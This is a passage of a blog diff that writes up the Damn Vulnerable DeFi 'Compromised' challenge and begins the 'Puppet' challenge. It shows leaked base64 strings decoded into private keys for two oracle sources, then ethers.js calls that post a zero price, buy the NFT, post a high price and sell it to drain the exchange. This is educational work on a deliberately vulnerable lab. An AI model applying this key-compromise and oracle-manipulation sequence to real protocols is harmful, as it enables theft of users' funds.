@@ -471,10 +471,89 @@ This price is fetched from an on-chain oracle, and is based on three trusted rep
 Our goal is to steal all ETH available in the exchange, starting with 0.1 ETH.
 
 ### Contract Call Graphs
+There are 3 contracts:
+- Exchange.sol
+- TrustfulOracle.sol
+- TrustfulOracleInitializer.sol
 
+The contract diagram for the Exhange and TrustfulOracle generated with the Solidity Visual Auditor extension are the following:
+
+<figure style="text-align:center;">
+    <img src="https://raw.githubusercontent.com/seaona/blog/main/_media/damn-vulnerable-defi/trustful-oracle.png" title="TrustfulOracle" width="500"/>
+    <figcaption>Trustful Oracle</figcaption>
+</figure>
+
+<figure style="text-align:center;">
+    <img src="https://raw.githubusercontent.com/seaona/blog/main/_media/damn-vulnerable-defi/trustful-oracle.png" title="Exchange" width="350"/>
+    <figcaption>Exchange</figcaption>
+</figure>
 
 ### Required Knowledge
 - [Attach method from ethers.js](https://stackoverflow.com/questions/72820081/what-does-the-attach-method-do-in-ethers-js)
+- [Testing from different accounts](https://hardhat.org/hardhat-runner/docs/other-guides/waffle-testing#testing-from-a-different-account)
+- [Buffers and Encoding](https://nodejs.org/docs/latest/api/buffer.html#buffer_buffer)
+- [Ethers Wallet](https://docs.ethers.io/v5/api/signer/#Wallet)
+
+### Contracts Highlights
+We have an exchange where we can buy and sell NFTs at the price that the oracle estipulated. There's not much we can do at the Exchange contract, so let's look at the TrustfulOracle contract.
+Here we see the logic for setting up prices. Basically the sources can post prices for the NFTs and prices are then calculated as the median from all the sources prices.
+If only we could get the majority of the sources under our control, we could change the price of the NFTs to our convenience.
+
+### The Hack
+First of all, we are going to work with the data provided on the HTTP response. We notice that data is encoded as a Buffer. So let's try to convert it to string:
+
+Buffer to string
+- `MHhjNjc4ZWYxYWE0NTZkYTY1YzZmYzU4NjFkNDQ4OTJjZGZhYzBjNmM4YzI1NjBiZjBjOWZiY2RhZTJmNDczNWE5`
+
+- `MHgyMDgyNDJjNDBhY2RmYTllZDg4OWU2ODVjMjM1NDdhY2JlZDliZWZjNjAzNzFlOTg3NWZiY2Q3MzYzNDBiYjQ4`
+
+From the strings we get, we can suspect that is a base64 encoded string, as it fulfils the following conditions:
+- The length of a Base64-encoded string is always a multiple of 4
+- Only these characters are used by the encryption: “A” to “Z”, “a” to “z”, “0” to “9”, “+” and “/”
+- The end of a string can be padded up to two times using the “=”-character (this character is allowed in the end only)
+
+Decode from base64 string
+- `0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9`
+- `0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48`
+
+The strings we've obtained look very much like private keys, as they are 64 hex chars, so we can derive the public keys from the private keys, to check to which addresses correspond..
+
+To our surprise, the addresses are 2 of the oracle sources!
+
+Now that we have the private keys of 2/3 of the oracle, we can create two wallet instances with the private keys and modify the NFT prices in our convenience.
+
+1. Lower the price of the NFT using the 2 oracle sources accounts:
+- `await this.oracle.connect(source1).postPrice("DVNFT", '0');`
+- `await this.oracle.connect(source2).postPrice("DVNFT", '0');`
+
+2. Buy the NFT at low price
+- `await this.exchange.connect(attacker).buyOne({value: "1"});`
+
+3. Raise the price of the NFT using the 2 oracle sources acccounts
+- `await this.oracle.connect(source1).postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE);`
+- `await this.oracle.connect(source2).postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE);`
+
+4. Sell the NFT at high price
+- `await this.nftToken.connect(attacker).approve(this.exchange.address, 0);`
+- `await this.exchange.connect(attacker).sellOne(0);`
+
+5. Restore the price of the NFT back to the initial price
+- `await this.oracle.connect(source1).postPrice("DVNFT", INITIAL_NFT_PRICE);`
+- `await this.oracle.connect(source2).postPrice("DVNFT", INITIAL_NFT_PRICE);`
+
+## Challenge #8: Puppet
+### The Goal
+The Puppet challenge states the following:
+> There's a huge lending pool borrowing Damn Valuable Tokens (DVTs), where you first need to deposit twice the borrow amount in ETH as collateral. The pool currently has 100000 DVTs in liquidity.
+There's a DVT market opened in an Uniswap v1 exchange, currently with 10 ETH and 10 DVT in liquidity.
+
+Our goal is to steal all the tokens from the lending pool, starting with 25ETH and 1000 DVTs in balance.
+
+### Contract Call Graphs
+
+
+### Required Knowledge
+
 ### Contracts Highlights
 
 
